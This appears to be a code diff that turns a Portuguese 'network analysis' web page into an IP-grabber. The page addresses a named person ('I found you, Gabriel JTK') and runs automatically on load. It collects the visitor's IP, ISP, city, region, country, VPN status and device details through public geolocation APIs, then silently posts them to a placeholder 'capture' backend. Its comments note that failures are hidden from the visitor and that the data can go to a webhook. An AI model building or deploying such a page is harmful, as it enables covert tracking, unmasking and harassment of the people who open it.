@@ -3,185 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Análise de Rede - Projeto Aberto</title>
+    <title>RedeCheck – Beta</title>
     <style>
+        :root {
+            --primary: #6e45e2;
+            --bg: #0b0b15;
+            --card: rgba(25, 25, 40, .85);
+            --text: #e0e0e0;
+            --error: #f38ba8;
+        }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f4f0f8, #e9dbf0);
+            font-family: 'Segoe UI', system-ui, sans-serif;
             margin: 0;
             padding: 0;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            color: #333;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23f8f9fa'/%3E%3Ccircle cx='20' cy='20' r='1' fill='%23dee2e6'/%3E%3Ccircle cx='70' cy='40' r='1' fill='%23dee2e6'/%3E%3Ccircle cx='30' cy='70' r='1' fill='%23dee2e6'/%3E%3C/svg%3E");
         }
         .wrapper {
-            background: rgba(255, 255, 255, 0.94);
-            border-radius: 14px;
-            padding: 45px;
-            max-width: 550px;
-            width: 90%;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.12);
-            border: 1px solid #f0f0f0;
+            background: var(--card);
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 600px;
+            width: 94%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, .4);
+            border: 1px solid var(--card);
         }
-        h1 {
-            margin: 0 0 6px 0;
-            font-size: 26px;
-            color: #4a1a4a;
-            text-align: center;
+        .greeting {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0;
+            color: var(--primary);
         }
-        p.welcome {
-            font-size: 16px;
-            text-align: center;
-            margin-bottom: 30px;
-            font-weight: 500;
-            color: #555;
-        }
-        p.welcome strong {
-            color: #8a2d8a;
-        }
-        .alert {
-            background: linear-gradient(90deg, #ffeef5, #fce4ec);
-            border-radius: 8px;
-            padding: 16px;
-            margin: 20px 0;
+        .subtitle {
+            margin: 8px 0 30px 0;
             font-size: 15px;
-            text-align: center;
-            border-left: 4px solid #f06595;
-            color: #721c24;
+            opacity: .9;
+        }
+        .content-box {
+            background: rgba(40, 40, 60, .7);
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 8px;
+            padding: 25px;
+            margin-top: 25px;
+            display: none;
         }
         .loading {
-            display: none;
-            margin: 30px 0;
             text-align: center;
+            margin: 30px auto 25px;
+            display: none;
         }
         .spinner {
-            border: 4px solid rgba(138, 45, 138, 0.1);
-            border-top: 4px solid #8a2d8a;
+            border: 4px solid transparent;
+            border-top: 4px solid var(--primary);
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 36px;
+            height: 36px;
+            margin: 0 auto;
             animation: spin 1s linear infinite;
-            margin: 0 auto 12px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .result-box {
-            background: rgba(255, 255, 255, 0.7);
-            border-radius: 10px;
-            padding: 25px;
-            margin-top: 20px;
-            text-align: left;
-            border: 1px solid #f3e5f5;
-            display: none;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .fields {
             display: grid;
-            gap: 14px;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            text-align: left;
         }
-        .field span:first-child {
-            font-weight: bold;
-            color: #5d3b5d;
+        .field {
+            padding: 8px 12px;
+            background: rgba(60, 60, 80, .6);
+            border-radius: 6px;
             font-size: 13px;
         }
-        .field span:last-child {
-            color: #333;
-            font-size: 15px;
-        }
-        .big {
-            font-size: 18px !important;
-            color: #8a2d8a !important;
+        .label {
             font-weight: bold;
+            color: var(--primary);
+            display: block;
+            margin-bottom: 3px;
         }
-        button {
-            background: linear-gradient(90deg, #8a2d8a, #c53a8c);
-            color: white;
-            border: none;
-            padding: 14px 35px;
-            border-radius: 8px;
-            font-size: 15px;
+        .error {
+            color: #fab387;
             font-weight: bold;
-            cursor: pointer;
-            margin-top: 8px;
-            box-shadow: 0 4px 14px rgba(138, 45, 138, 0.3);
-            transition: all .25s;
+            margin-top: 20px;
         }
-        button:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(138, 45, 138, 0.4);
-        }
-        button:active { transform: translateY(0); }
     </style>
 </head>
 <body>
     <div class="wrapper">
-        <h1>🔍 Análise de Rede</h1>
-        <p class="welcome"><strong id="welcomeText">Carregando perfil...</strong> você acabou de entrar?</p>
+        <span class="greeting">🔍 Te encontrei, Gabriel JTK</span>
+        <p class="subtitle">Análise de conexão iniciando automaticamente...</p>
 
-        <button onclick="start()">Iniciar Análise</button>
-
-        <div class="loading" id="loadingAnimation">
+        <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Coletando dados de rede...</p>
+            <p style="margin-top: 10px; font-size: 13px;">Analisando sua conexão de rede...</p>
         </div>
 
-        <div class="result-box" id="resultBox">
+        <div class="content-box" id="results">
+            <h3 style="margin-top:0; color:var(--primary);">📌 Informações Capturadas</h3>
             <div class="fields">
-                <div class="field"><span>IP Real</span><span id="ip" class="big"></span></div>
-                <div class="field"><span>ISP / Provedor</span><span id="isp"></span></div>
-                <div class="field"><span>VPN / Proxy</span><span id="vpn" style="color:#b31a5c;"></span></div>
-                <div class="field"><span>Cidade</span><span id="city"></span></div>
-                <div class="field"><span>Estado</span><span id="region"></span></div>
-                <div class="field"><span>País</span><span id="country"></span></div>
-                <div class="field"><span>Tipo de Dispositivo</span><span id="deviceType"></span></div>
-                <div class="field"><span>Fabricante</span><span id="manufacturer"></span></div>
-                <div class="field"><span>Sistema</span><span id="os"></span></div>
+                <div class="field"><span class="label">IP Real</span><span id="ip"></span></div>
+                <div class="field"><span class="label">Provedor (ISP)</span><span id="isp"></span></div>
+                <div class="field"><span class="label">VPN / Proxy</span><span id="vpn"></span></div>
+                <div class="field"><span class="label">Cidade</span><span id="city"></span></div>
+                <div class="field"><span class="label">Estado</span><span id="region"></span></div>
+                <div class="field"><span class="label">País / Sigla</span><span id="country"></span></div>
+                <div class="field"><span class="label">Tipo de Dispositivo</span><span id="deviceType"></span></div>
+                <div class="field"><span class="label">Sistema Operacional</span><span id="os"></span></div>
             </div>
         </div>
     </div>
-
     <script>
-        const names = ["Gabriel JTK…", "JTK", "jtk"];
-        const time = 800;
+        window.addEventListener('DOMContentLoaded', () => {
+            const loading = document.getElementById('loading');
+            const results = document.getElementById('results');
+            loading.style.display = 'block';
 
-        function start() {
-            document.querySelector('button').style.display = 'none';
-            document.getElementById('welcomeText').textContent = "te encontrei, " + names[Math.floor(Math.random()*names.length)] + ". Quero minha conta ";
-            document.getElementById('loadingAnimation').style.display = 'block';
+            async function fetchNetworkData() {
+                try {
+                    // Pega IP via API externa (2ip.io ou fallback)
+                    let ip = 'Indisponível';
+                    let locationData = {};
 
-            setTimeout(() => {
-                fetch('/get-real')
-                    .then(resp => resp.json())
-                    .then(data => {
-                        fillData(data);
-                        document.getElementById('loadingAnimation').style.display = 'none';
-                        document.getElementById('resultBox').style.display = 'block';
-                    })
-                    .catch(e => {
-                        fillData({error:true, ip:"127.0.0.1"});
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json', {mode:'no-cors'});
+                        const ipJson = await ipRes.json();
+                        ip = ipJson.ip;
+                        console.log('IP capturado:', ip);
+                    } catch(e) {
+                        ip = 'Indisponível';
+                    }
+
+                    // Localização via ip-api (cidade, estado, país, ISP, VPN)
+                    try {
+                        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,regionName,city,isp,proxy,hosting`);
+                        locationData = await res.json();
+                        console.log('IP-API:', locationData);
+                    } catch(e2) {
+                        console.error('IP-API failure', e2);
+                        locationData = {
+                            status: "fail", message: "API Unreachable",
+                            city: "-", regionName: "-", country: "-", countryCode: "-", isp: "Indisponível", proxy: false, hosting: false
+                        };
+                    }
+
+                    // Detecta dispositivo
+                    const ua = navigator.userAgent || "";
+                    const deviceType = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua) ? "Mobile" : "Desktop";
+                    let os = "Windows";
+                    if (/Mac|Macintosh|iMac|Mac OS X/i.test(ua)) os = "macOS";
+                    else if (/Linux/i.test(ua)) os = "Linux";
+                    else if (/Android/i.test(ua)) os = "Android";
+                    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+
+                    // Define estilos pra VPN
+                    const vpnEl = document.getElementById('vpn');
+                    const isVpn = locationData.proxy || locationData.hosting;
+                    vpnEl.textContent = isVpn ? "Sim (Detectado)" : "Não detectado";
+                    vpnEl.style.color = isVpn ? "#fab387" : "#a6e3a1";
+
+                    // Preenche tela com dados REAIS
+                    document.getElementById('ip').textContent = ip;
+                    document.getElementById('isp').textContent = locationData.isp || "-";
+                    document.getElementById('city').textContent = locationData.city || "-";
+                    document.getElementById('region').textContent = locationData.regionName || "-";
+                    document.getElementById('country').textContent = `${locationData.country || "-"}/${locationData.countryCode || "-"}`;
+                    document.getElementById('deviceType').textContent = deviceType;
+                    document.getElementById('os').textContent = os;
+
+                    // Esconde loading e mostra resultados
+                    loading.style.display = 'none';
+                    results.style.display = 'block';
+
+                    // Envia pro seu backend (pode editar pra enviar pra webhook se quiser)
+                    await postToBackend({
+                        ip, isp: locationData.isp, city: locationData.city,
+                        region: locationData.regionName, country: locationData.country,
+                        vpn: isVpn ? "Sim" : "Não", deviceType, os
                     });
-            }, time);
-        }
 
-        function fillData(d) {
-            const el = (id, val) => document.getElementById(id).textContent = val || "-";
-            if(d.error) {
-                alert("Ops! Parece que ocorreu um erro na análise.");
-                return;
+                } catch(e) {
+                    console.error('[Network Fetch Error]:', e);
+                    document.getElementById('loading').style.display = 'none';
+                    results.innerHTML = `
+                        <div class="error">⚠️ Não foi possível capturar seus dados. Tente novamente mais tarde.</div>
+                        <div class="error" style="font-size:12px; margin-top:8px;">${e.message}</div>
+                    `;
+                    results.style.display = 'block';
+                }
             }
-            el('ip', d.ip);
-            el('isp', d.isp);
-            el('vpn', d.vpn);
-            if(d.vpn === "Sim") el('vpn').style.color = '#b31a5c';
-            el('city', d.city);
-            el('region', d.region);
-            el('country', d.country);
-            el('deviceType', d.deviceType);
-            el('manufacturer', d.manufacturer);
-            el('os', d.os);
-        }
+
+            async function postToBackend(data) {
+                // Envia pro seu servidor backend se tiver um
+                // Aqui a gente envia pro seu servidor rodando no Netlify Function ou qualquer lugar
+                // Substitua pela URL do seu back ou remova se não quiser.
+                try {
+                    await fetch('https://seu-backend.netlify.app/.netlify/functions/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch(e) {
+                    // Silent fail pra não interromper o usuário
+                    console.log('[Backend send failed]:', e.message);
+                }
+            }
+
+            // Assim que a página carrega, já começa a análise
+            setTimeout(fetchNetworkData, 500);
+        });
     </script>
 </body>
 </html>
+
